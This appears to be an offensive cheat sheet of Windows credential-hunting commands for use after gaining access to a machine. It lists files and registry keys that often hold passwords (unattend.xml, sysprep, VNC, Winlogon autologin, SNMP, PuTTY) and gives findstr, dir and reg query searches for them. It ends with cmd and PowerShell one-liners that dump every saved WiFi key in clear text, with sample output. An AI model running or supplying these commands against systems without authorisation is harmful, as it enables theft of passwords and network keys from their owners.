# Passwords In Files:
These are common files to find them in. They might be base64-encoded. So look out for that.

1. c:\sysprep.inf
2. c:\sysprep\sysprep.xml
3. c:\unattend.xml
4. %WINDIR%\Panther\Unattend\Unattended.xml
5. %WINDIR%\Panther\Unattended.xml


## clear text Passwords
### findstr /si password *.txt *.ini *.config *.xml
Look through output. most will help files, but you might get lucky and find an actual password file. 

## Find all those strings in config files.
### dir /s *pass* == *cred* == *vnc* == *.config*

## Find all passwords in all files.
### findstr /spin "password" *.*

## Other Searches
```
dir c:\*unattend.xml /s /b
```

```
dir c:\*vnc.ini /s /b
```

```
dir c:\*ultravnc.ini /s /b 
```

```
dir c:\ /s /b | findstr /si *vnc.ini
```

# Passwords In Registry:
## VNC
```
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

## Windows autologin

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

## SNMP Paramters
```
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

## Putty
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

## Search for password in registry
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```



# WiFi Passwords
## Grab all wifi passwords and format the output to be easy to read:
```
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

### netsh wlan show profile

```
C:\>netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : NETGEAR59
```
### netsh wlan show profile name="NETWORK" key=clear
### netsh wlan show profile NETGEAR59 key=clear
```
C:\>netsh wlan show profile NETGEAR59 key=clear

Profile NETGEAR59 on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : NETGEAR59
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "NETGEAR59"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : password123		<== Clear Text Password

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default
```


# Powershell Wifi Password Greb
## Grab all wifi passwords and format the output to be easy to read:
```
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize
```







